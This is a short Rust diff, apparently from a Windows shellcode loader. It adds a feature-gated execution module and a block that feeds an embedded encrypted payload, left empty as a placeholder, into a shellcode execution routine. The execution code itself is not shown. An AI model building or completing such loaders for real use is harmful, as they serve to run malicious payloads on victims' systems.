@@ -5,6 +5,9 @@ use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
 use windows::core::{PSTR, s};
 use std::ffi::c_void;
 
+#[cfg(feature = "ShellcodeExecuteDefault")]
+mod execution;
+
 #[cfg(feature = "embedded")]
 const ENCPAYLOAD: &[u8] = &[];  // replace with the encrypted payload data
 
@@ -38,4 +41,13 @@ fn main() {
         }
         #[cfg(feature = "calculation")]
         calculate();
+
+        // Execute shellcode using default execution method
+        #[cfg(all(feature = "ShellcodeExecuteDefault", feature = "embedded"))]
+        {
+            let shellcode = ENCPAYLOAD.to_vec();
+            if !execution::shellcode_execute_default(shellcode) {
+                eprintln!("Failed to execute shellcode");
+            }
+        }
 }
